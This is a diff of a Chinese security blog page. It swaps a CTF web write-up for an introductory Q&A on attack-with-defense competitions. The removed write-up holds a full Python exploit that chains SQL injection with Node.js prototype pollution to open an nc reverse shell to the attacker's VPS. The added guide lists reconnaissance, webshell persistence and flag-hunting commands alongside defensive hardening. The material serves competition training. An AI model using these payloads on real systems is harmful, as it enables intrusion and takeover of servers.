@@ -17,7 +17,7 @@
   <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。">
   <meta name="author" content="slug01sh">
   <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF">
-  <title>【CTF系列】2021年3月-AntCTF Web WP - Exploit - 积淀｜小杰的个人博客</title>
+  <title>AWD入门12问 - 积淀｜小杰的个人博客</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -181,12 +181,12 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210409133847.png') no-repeat center center;
+         style="background: url('https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506195438.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="【CTF系列】2021年3月-AntCTF Web WP - Exploit">
+            <span class="h2" id="subtitle" title="AWD入门12问">
               
             </span>
 
@@ -196,8 +196,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-12 10:23" pubdate>
-        2021年3月12日 上午
+      <time datetime="2021-05-06 09:08" pubdate>
+        2021年5月6日 上午
       </time>
     </span>
   
@@ -208,7 +208,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      604 字
+      1.3k 字
     </span>
   
 
@@ -218,7 +218,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      14
        分钟
     </span>
   
@@ -248,44 +248,175 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">【CTF系列】2021年3月-AntCTF Web WP - Exploit</h1>
+            <h1 style="display: none">AWD入门12问</h1>
             
             <div class="markdown-body">
-              <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-8-bit-pub"><a href="#1-8-bit-pub" class="headerlink" title="1 8-bit-pub"></a>1 8-bit-pub</h2><ol>
-<li>使用 <code>docker-compose up --build</code> 启动环境。<a target="_blank" rel="noopener" href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">题目传送门</a></li>
-<li>修改 exp 相关配置，运行 exp。</li>
-<li>在<strong>服务器</strong>监听 9999 端口，即使用命令 <code>nc -lvnp 9999</code>。执行 readflag。<blockquote>
-<p>备注：该题共 3 种做法，其他做法的 exp 请查看 Github 项目 <a target="_blank" rel="noopener" href="https://github.com/slug01sh/ctf-writeups/tree/master/2021/2021-antctf">ctf-writeups</a>)</p>
+              <p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506094146.png" srcset="/img/loading.gif"></p>
+<p>（图片说明：AWD需要抢时间，提前进行充分的准备，尽量能使用脚本一键利用，而不是像解题模式慢慢的测试）</p>
+<h2 id="0x01-AWD是什么？AWD比赛形式是怎样的？"><a href="#0x01-AWD是什么？AWD比赛形式是怎样的？" class="headerlink" title="0x01 AWD是什么？AWD比赛形式是怎样的？"></a>0x01 AWD是什么？AWD比赛形式是怎样的？</h2><p>AWD的全称是Attack With Defense，攻击成功会得分，但是如果被别人攻击就会扣分（防守弱）。</p>
+<p>AWD的一般流程：</p>
+<ol>
+<li>出题方会给每支队伍部署「相同」环境的机器。</li>
+<li>拿到机器后，每支队伍会有加固时间或者没有加固时间，具体看比赛举办方。</li>
+<li>每个服务，数据库，主机上都存在flag，定时刷新。通过攻击拿到flag之后，一般会提供指定的接口，下一次刷新之后，如果还存在该漏洞，可以继续利用该漏洞拿分。<blockquote>
+<p><del>需要提交 flag 的脚本</del>（现场写吧，规则很可能不同）</p>
 </blockquote>
 </li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">version 1:</span><br><span class="hljs-string">1. 污染nodemail库</span><br><span class="hljs-string">2. 使用nc反弹shell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> sys<br><br>VPS_HOST = os.environ.get(<span class="hljs-string">&quot;VPS_HOST&quot;</span>)  <span class="hljs-comment"># 从环境变量读取VPS的IP</span><br>VPS_PORT = <span class="hljs-number">9999</span><br>BASE_URL = <span class="hljs-string">&quot;http://127.0.0.1:3000&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vps_init</span>():</span><br>    print(<span class="hljs-string">f&quot;vps host:<span class="hljs-subst">&#123;VPS_HOST&#125;</span>&quot;</span>)<br>    flag = input(<span class="hljs-string">&quot;run &#x27;nc -lvnp 9999&#x27; in your vps! yes or no(y/n)?&quot;</span>)<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-string">&#x27;y&#x27;</span> <span class="hljs-keyword">or</span> flag.lower == <span class="hljs-string">&#x27;yes&#x27;</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;exit!&quot;</span>)<br>        sys.exit()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_headers</span>() -&gt; dict:</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json; charset=UTF-8&quot;</span>,<br>    &#125;<br>    <span class="hljs-keyword">return</span> headers<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">json2string</span>(<span class="hljs-params">data</span>) -&gt; str:</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    json转字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param data: 需要发送的json数据</span><br><span class="hljs-string">    :return: json的字符串格式</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> json.dumps(data)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pretty_print_POST</span>(<span class="hljs-params">req</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    打印 Request 对象</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param req: Request对象</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    print(<span class="hljs-string">&#x27;&#123;&#125;\n&#123;&#125;\r\n&#123;&#125;\r\n\r\n&#123;&#125;&#x27;</span>.format(<br>        <span class="hljs-string">&#x27;-----------START-----------&#x27;</span>,<br>        req.method + <span class="hljs-string">&#x27; &#x27;</span> + req.url,<br>        <span class="hljs-string">&#x27;\r\n&#x27;</span>.join(<span class="hljs-string">&#x27;&#123;&#125;: &#123;&#125;&#x27;</span>.format(k, v) <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> req.headers.items()),<br>        req.body,<br>    ))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sql_inject</span>():</span><br>    login_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/user/signin&quot;</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">1</span><br>        &#125;<br>    &#125;  <span class="hljs-comment"># 服务器执行的SQL语句：SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = `password` = true</span><br>    data = json2string(data=data)<br>    response = session.post(login_url, data=data, headers=headers)<br>    print(response.text)  <span class="hljs-comment"># &#123;&quot;message&quot;:&quot;Signin success.&quot;&#125;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pollute</span>():</span><br>    sendmail_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/admin/email&quot;</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;to&quot;</span>: <span class="hljs-string">&quot;slug01sh@gmail.com&quot;</span>,<br>        <span class="hljs-string">&quot;subject&quot;</span>: <span class="hljs-number">123</span>,<br>        <span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-number">456</span>,<br>        <span class="hljs-string">&quot;constructor.prototype.sendmail&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>        <span class="hljs-string">&quot;constructor.prototype.args&quot;</span>: [<br>            <span class="hljs-string">&quot;-c&quot;</span>,<br>            <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;VPS_HOST&#125;</span> <span class="hljs-subst">&#123;VPS_PORT&#125;</span> -e /bin/sh&quot;</span><br>            <span class="hljs-comment"># 如果在 mac 上搭建测试环境，而不是 docker，不能使用 nc，而是使用 ncat。</span><br>        ],<br>        <span class="hljs-string">&quot;constructor.prototype.path&quot;</span>: <span class="hljs-string">&quot;/bin/sh&quot;</span><br>    &#125;<br><br>    data = json2string(data=data)<br>    response = session.post(sendmail_url, data=data, headers=headers)<br>    print(response.text)  <span class="hljs-comment"># &#123;&quot;message&quot;:&quot;Signin success.&quot;&#125;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 检查基本配置</span><br>    vps_init()<br><br>    session = requests.Session()<br>    headers = get_headers()<br><br>    <span class="hljs-comment"># 1. SQL注入登陆admin：多读文档，自动类型转换很可能有意想不到的后果。</span><br>    sql_inject()<br><br>    <span class="hljs-comment"># 2. nodejs原型链污染：漏洞修复过!=修好了，有可能黑名单没有过滤完全。</span><br>    pollute()<br><br>    <span class="hljs-comment"># 3. 在服务器使用nc监听9999端口，getshell</span><br></code></pre></td></tr></table></figure>
-
-
+<hr>
+<h2 id="0x02-AWD需要哪些基础知识？"><a href="#0x02-AWD需要哪些基础知识？" class="headerlink" title="0x02 AWD需要哪些基础知识？"></a>0x02 AWD需要哪些基础知识？</h2><p>防御</p>
+<ol>
+<li>流量回放：通过分析对方的攻击流量，知道自己的弱点，知道对方的弱点（可能对方没来得及加固）</li>
+<li>Linux相关：WAF的使用，修复漏洞。</li>
+</ol>
+<p>Web攻击</p>
+<ol>
+<li>Web漏洞（针对不同服务，不一定是Web）</li>
+<li>内网渗透（时间长的比赛需要）<blockquote>
+<p>基本流程：信息收集、攻击端口、攻击Web服务、维持权限。（手快才是关键，🐶）</p>
+</blockquote>
+</li>
+</ol>
+<p>重点在于代码审计、自动化脚本编写的能力。</p>
+<h2 id="0x03-队员应该怎么分工？"><a href="#0x03-队员应该怎么分工？" class="headerlink" title="0x03 队员应该怎么分工？"></a>0x03 队员应该怎么分工？</h2><p>大致可以分为攻击和防守。</p>
+<p>负责两个方面：</p>
+<ul>
+<li>一方面负责防守加固、做基线、加WAF、流量回放等等。</li>
+<li>一方面负责源码审计、写攻击脚本、维持权限、持续渗透，具体怎么安排都视三人能力而定。<blockquote>
+<p>需要准备一些脚本、常见的命令。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="0x04-流程大致是怎样的？"><a href="#0x04-流程大致是怎样的？" class="headerlink" title="0x04 流程大致是怎样的？"></a>0x04 流程大致是怎样的？</h2><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>a.信息收集</p>
+<ol>
+<li>探测主机。利用nmap确认存活主机的IP，搞清楚网络拓扑。</li>
+<li>探测端口。确认主机之后，探测端口。（也可以看自己的机器开了什么端口，所有的机器都是一样的）</li>
+<li>探测端口服务。可以使用nmap扫描相关的漏洞（或者msf）。<blockquote>
+<p>需要准备nmap相关的命令。</p>
+<ul>
+<li>扫描端口</li>
+<li>扫描漏洞</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+<p>b.攻击端口</p>
+<ol>
+<li>弱密码攻击常见端口。</li>
+<li>扫描端口存在的服务，是否存在漏洞。<blockquote>
+<p>需要准备弱密码字典。</p>
+</blockquote>
+</li>
+</ol>
+<p>c. 攻击服务</p>
+<ol>
+<li>使用D盾等WAF查杀后门或WebShell，将自己电脑中的后门先关闭。</li>
+<li>使用源码审计工具审核出比较明显的漏洞。（seay）</li>
+<li>最后再尝试绕过文件上传、SQL注入、反序列化。<blockquote>
+<p>需要再电脑中准备好 exp 库、漏洞库、各种扫描工具。</p>
+</blockquote>
+</li>
+</ol>
+<p>d. 权限维持</p>
+<ol>
+<li>反弹shell</li>
+<li>不死马（不好不要直接用Webshell）<blockquote>
+<p>需要了解一下权限维持相关的技术，以及脚本准备。</p>
+</blockquote>
+</li>
+</ol>
+<p>快速找 flag：</p>
+<ol>
+<li><code>tac `find / -iname flag*`</code></li>
+<li><code>find / -name *flag*</code></li>
+<li><code>grep -rn &quot;flag&quot; *</code></li>
+</ol>
+<h3 id="防御流程"><a href="#防御流程" class="headerlink" title="防御流程"></a>防御流程</h3><p>a. 让网站保持稳定。</p>
+<ol>
+<li>备份源码。</li>
+<li>备份数据库。<blockquote>
+<p>需要准备备份数据库、备份源码相关的命令。</p>
+</blockquote>
+</li>
+</ol>
+<p>b. 系统安全检查</p>
+<ol>
+<li>修改ssh、mysql的弱密码</li>
+<li>关闭不该开启的端口<blockquote>
+<p>准备相关安全检查的脚本。</p>
+</blockquote>
+</li>
+</ol>
+<p>c. 部署WAF</p>
+<ol>
+<li>部署WAF</li>
+<li>验证WAF是否可用<blockquote>
+<p>需要准备WAF相关的源码，以及部署相关的脚本。</p>
+</blockquote>
+</li>
+</ol>
+<p>d. 修改权限</p>
+<ol>
+<li>上传目录的执行权限。</li>
+<li>MySQL不允许写文件。</li>
+</ol>
+<p>e. 部署文件监控脚本</p>
+<ol>
+<li>监控可读写的文件是否新增或者删除文件。</li>
+</ol>
+<p>f. 部署流量监控脚本，开启服务器日志记录。</p>
+<ol>
+<li>监控流量。</li>
+<li>分析对方是如何攻击自己的。</li>
+<li>用类似的手段攻击其他机器。（注意混淆流量）</li>
+</ol>
+<h2 id="0x05-有哪些需要注意的事情？"><a href="#0x05-有哪些需要注意的事情？" class="headerlink" title="0x05 有哪些需要注意的事情？"></a>0x05 有哪些需要注意的事情？</h2><ol>
+<li>准备脚本。</li>
+<li>优化攻击和防御流程。<blockquote>
+<p>其他基础都在于平时的积累。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="0x6-Web狗需要具备的能力有哪些？"><a href="#0x6-Web狗需要具备的能力有哪些？" class="headerlink" title="0x6 Web狗需要具备的能力有哪些？"></a>0x6 Web狗需要具备的能力有哪些？</h2><ol>
+<li>快速漏洞的反应能力。</li>
+<li>快速编写脚本的能力。</li>
+<li>一个好的心态。</li>
+</ol>
+<h2 id="0x07-当处于劣势时，应该怎么做？"><a href="#0x07-当处于劣势时，应该怎么做？" class="headerlink" title="0x07 当处于劣势时，应该怎么做？"></a>0x07 当处于劣势时，应该怎么做？</h2><ol>
+<li>首先心态不要崩</li>
+<li>抓流量，分析其他队伍的Payload，进行反打。</li>
+<li>如果被种Webshell，那么可能其他机器也有Webshell，密码也一样，可以借机潜入。</li>
+</ol>
+<h2 id="0x08-如何防守？"><a href="#0x08-如何防守？" class="headerlink" title="0x08 如何防守？"></a>0x08 如何防守？</h2><p>在问题四中已经说过，主要关注以下几点：</p>
+<ol>
+<li>保护机器的稳定。</li>
+<li>保持无后门。</li>
+<li>分析流量。</li>
+</ol>
+<h2 id="0x09-有什么比较好的AWD框架？"><a href="#0x09-有什么比较好的AWD框架？" class="headerlink" title="0x09 有什么比较好的AWD框架？"></a>0x09 有什么比较好的AWD框架？</h2><p>逛了一圈，最完善的AWD框架已经被喝茶，停止更新，估计有很多问题。</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/SniperOJ/Attack-Defense-Framework">https://github.com/SniperOJ/Attack-Defense-Framework</a></li>
+</ol>
+<h2 id="0x10-D盾是什么？有没有更好的替代品？"><a href="#0x10-D盾是什么？有没有更好的替代品？" class="headerlink" title="0x10 D盾是什么？有没有更好的替代品？"></a>0x10 D盾是什么？有没有更好的替代品？</h2><p>D盾是一种Web后门查杀工具，能查找隐藏在Linux中的Web后门。</p>
+<p>已经下载，感觉还不错。</p>
+<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210506191701.png" srcset="/img/loading.gif"><br>在虚拟机中扫描后就卡了，算了，重新找个吧。</p>
+<p>没找到替代品，文件少点就不会卡。</p>
+<h2 id="0x11-awd怎么上WAF？上什么WAF？"><a href="#0x11-awd怎么上WAF？上什么WAF？" class="headerlink" title="0x11 awd怎么上WAF？上什么WAF？"></a>0x11 awd怎么上WAF？上什么WAF？</h2><p>WAF：</p>
+<ul>
+<li>AoiAWD：推荐。<a target="_blank" rel="noopener" href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></li>
+<li>awd-watchbird</li>
+</ul>
+<p>配置教程：</p>
+<ol>
+<li>AoiAWD：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/stayelegance/p/14393260.html">https://www.cnblogs.com/stayelegance/p/14393260.html</a><br>（没有实战经验）</li>
+</ol>
+<h2 id="0x12-了解完上面的基础知识应该做什么？"><a href="#0x12-了解完上面的基础知识应该做什么？" class="headerlink" title="0x12 了解完上面的基础知识应该做什么？"></a>0x12 了解完上面的基础知识应该做什么？</h2><p>找个靶场，尝试一下，毕竟在拼速度，肯定是亲自做过会更快，更容易拿分。</p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">任意文件读取</a>
-                    
-                  </div>
                 
               </div>
               
@@ -296,18 +427,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/3b8002e7a287/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【个人感悟】走近王垠</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/fdf6e02b1ae5/">
-                        <span class="hidden-mobile">【计算机基础】编译原理总结</span>
+                      <a href="/9c416611969b/">
+                        <span class="hidden-mobile">博客新见解：发布即完结</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
